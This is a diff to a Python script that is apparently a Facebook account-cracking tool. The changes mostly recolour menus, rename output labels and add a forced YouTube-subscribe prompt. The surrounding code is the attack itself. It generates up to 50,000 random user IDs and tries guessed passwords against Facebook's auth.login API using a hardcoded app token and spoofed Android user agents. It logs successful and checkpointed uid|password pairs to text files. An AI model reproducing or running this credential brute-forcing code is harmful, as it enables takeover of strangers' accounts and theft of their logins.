@@ -419,15 +419,16 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("")
+		print("╔════════════════════════════════════════════════════╗")
 		print("\033[1;37m  Note :  Approval Ka LiYa Channel Ko Subsacribe Kara")
 		print("╚════════════════════════════════════════════════════╝")
 		
 		
 		print("")
-		print("\033[1;32m [1] First Subsacribe My Channel ")
-		print("\033[1;33m [2] Exit")
+		print("\033[1;37m [1] First Subsacribe My Channel ")
+		print("\033[1;37m [2] Exit")
 		print("")
-		Baloch = input("\n\033[1;31m  Chose  \033[1;32m")
+		Baloch = input("\n\033[1;37m  Chose  \033[1;32m")
 		if Baloch in ["", " "]:
 			exit()
 		elif Baloch in ["2", "02"]:
@@ -437,20 +438,22 @@ class Main:
 			os.system("xdg-open https://youtube.com/channel/UCNW6oM8GOBzTVKkq3lTaqnw/")
 			print("")
 			time.sleep(2.0)
-			print("\033[1;33m    Checking Subsacribetion")
+			print("\033[1;37m    Checking Subsacribetion")
 			print("")
-			input("\n\033[1;32m  Type You Are Channel Name \033[1;36m")
+			input("\n\033[1;37m  Type You Are Channel Name \033[1;36m")
 			time.sleep(2.1)
 			print("")
-			print("\033[1;32m Done ")
+			print("\033[1;37m Done ")
 			time.sleep(2.0)
 			os.system("clear")
 		print(logo)
-		print(" \033[1;37m[1]\033[1;97m CRACK FILE ")
+		print(" [▪]MENU METHOD")
+		print("\033[1;37mm - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ")
+		print(" \033[1;37m[1]\033[0;97m FILE CLONING ")
 		print(" \033[1;37m[2] PUBLIC CLONING ")
-		print(" \33[1;37m[3] RANDOM CLONING ")
-		print(" \033[1;37m[4] OLD ACCOUNT CLONING")
-		print(" \33[1;37m[5] 2004 ACCOUNT CLONING")
+		print(" \33[1;37[3] RANDOM CLONING ")
+		print(" \033[1;37m[4] OLD CLONING ")
+		print(" \33[1;37m[5] 2004 To 2009 CRACKING")
 		print("\033[1;37m [E] Exit \n")
 		UZAIR =input(" \033[1;37mChoose : ")
 		if UZAIR in ["1", "01"]:
@@ -474,7 +477,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[1;37m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -868,7 +871,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [Start]%s> /count>%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]%s> /CRACK>%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1299,7 +1302,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	])
 		sys.stdout.write(
-			"\r [Start]>%s/COUNT>%s -> Cp:-%s - Ok:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]>%s/CRACK>%s -> Cp:-%s - Ok:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1316,15 +1319,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[KAVIDU-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[SOMAIL-OK] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-MRD-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("SOMAIL-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;93m[KAVIDU-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;93m[SOMAIL-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-KAVIDU-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("SOMAIL-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
